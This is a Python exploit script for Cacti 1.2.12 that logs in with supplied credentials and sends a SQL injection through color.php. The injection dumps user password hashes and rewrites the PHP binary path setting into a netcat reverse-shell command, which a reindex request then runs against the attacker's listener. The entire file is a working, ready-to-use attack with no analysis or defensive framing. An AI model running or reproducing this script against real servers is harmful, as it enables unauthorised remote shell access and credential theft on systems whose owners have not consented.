import argparse
import requests
import re
import time

class Cacti():
    def __init__(self,target,username,password,lhost,lport):
        self.target = target
        self.username = username
        self.password = password
        self.lhost = lhost
        self.lport = lport
        self.new_url = self.url_fix()
        self.nccheck()

    def url_fix(self):
        if self.target[-1] == "/":
            fixed_url = self.target.rstrip(self.target[-1])
            return fixed_url
        else:
            return self.target

    def nccheck(self):
        while True:
            nc_check = input("Is netcat running? y or n? ")
            if nc_check == 'y':
                self.sql_exploit()
                break
            elif nc_check == 'n':
                print("Make sure netcat is running with nc -lvnp " + self.lport)
                continue
            else:
                print("Incorrect Input. Only y or n are allowed.")
                continue

    def sql_exploit(self):
        requests.packages.urllib3.disable_warnings()
        login_url = self.new_url + '/cacti/index.php'

        print("Getting the csrf token!")
        time.sleep(1)

        session = requests.Session()
        csrf_url_req = session.get(login_url,verify=False)
        
        csrf = re.findall("srfMagicToken = \"(.*);ip",csrf_url_req.text)
        
        print("The csrf is token is: " + csrf[0])
        time.sleep(1)

        data = {'__csrf_magic':csrf[0],'action':'login','login_username':self.username,'login_password':self.password}

        print("Logging in")
        time.sleep(1)
        login_req = session.post(login_url,data=data,verify=False)

        print("Sending payload")
        time.sleep(1)

        sql_inj_line = """/cacti/color.php?action=export&header=false&filter=1%27)+UNION+SELECT+1,username,password,4,5,6,7+
        from+user_auth;update+settings+set+value=%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|
        nc+"""+self.lhost+"""+"""+self.lport+"""+%3E/tmp/f;%27+where+name=%27path_php_binary%27;--+-"""

        sql_inj_url = self.new_url + sql_inj_line
        sql_inj_req = session.get(sql_inj_url,verify=False)

        payload_execute_url = self.new_url + "/cacti/host.php?action=reindex"
        payload_execute_req = session.get(payload_execute_url,verify=False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Cacti 1.2.12 - SQL Injection / Authenticated Remote Code Execution')

    parser.add_argument('-t', metavar='<Target URL>', help='target/host URL, E.G: http://exploitcacti.com', required=True)
    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
    parser.add_argument('-lhost', metavar='<lhost>', help='Your IP Address', required=True)
    parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=True)
    args = parser.parse_args()

    try:
        Cacti(args.t,args.u,args.p,args.lhost,args.lport)
    except KeyboardInterrupt:
        print("Bye Bye!")
        exit()